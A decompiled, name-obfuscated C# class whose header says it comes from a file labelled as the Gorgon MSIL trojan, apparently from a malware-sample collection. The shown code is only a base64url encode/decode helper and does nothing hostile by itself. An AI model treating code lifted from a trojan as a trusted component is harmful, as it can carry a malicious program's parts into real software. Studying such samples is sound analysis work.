// Decompiled with JetBrains decompiler
// Type: Ezck4v1MvuVkj.CIRaqtLuE8G19
// Assembly: Udby4Jt48oXkJ, Version=3.17.2.31, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a
// MVID: 37899E89-D673-4F5B-A193-2E4DF6A54096
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Gorgon.gen-bf535869266eca7a958714acade2ede1bff0e73f0aaa2702f389ededee6a8d6a.exe

using System;
using System.Globalization;
using System.Text;

namespace Ezck4v1MvuVkj
{
  internal static class CIRaqtLuE8G19
  {
    private const char dgCihDQPpfamv = '=';
    private const char \u0037aCkGzb2SgSaM = '+';
    private const char SHNaWyY5SCuCP = '/';
    private const char rktVRP3aHHG6b = '-';
    private const char MLn4rK1TmvdWF = '_';
    private static readonly Encoding kZ4fPDOhYw65X = Encoding.UTF8;
    private static readonly string jYiyzM2GPdmkf = string.Format((IFormatProvider) CultureInfo.InvariantCulture, "{0}{0}", new object[1]
    {
      (object) '='
    });

    public static string LpmyXUIPErSYJ(string AsySpQVQh3Tcq) => AsySpQVQh3Tcq != null ? CIRaqtLuE8G19.rnaQUivF1DMPH(CIRaqtLuE8G19.kZ4fPDOhYw65X.GetBytes(AsySpQVQh3Tcq)) : throw new ArgumentNullException("arg");

    public static byte[] DnllxR21XPKRG(string ksXSUUbcXWFmA)
    {
      string s = ksXSUUbcXWFmA.Replace('-', '+').Replace('_', '/');
      switch (s.Length % 4)
      {
        case 0:
          return Convert.FromBase64String(s);
        case 2:
          s += CIRaqtLuE8G19.jYiyzM2GPdmkf;
          goto case 0;
        case 3:
          s += "=";
          goto case 0;
        default:
          throw new ArgumentException("Illegal base64url string!", "arg");
      }
    }

    internal static string rnaQUivF1DMPH(byte[] kUEN8QmnW0DkL) => kUEN8QmnW0DkL != null ? Convert.ToBase64String(kUEN8QmnW0DkL).Split('=')[0].Replace('+', '-').Replace('/', '_') : throw new ArgumentNullException("arg");
  }
}
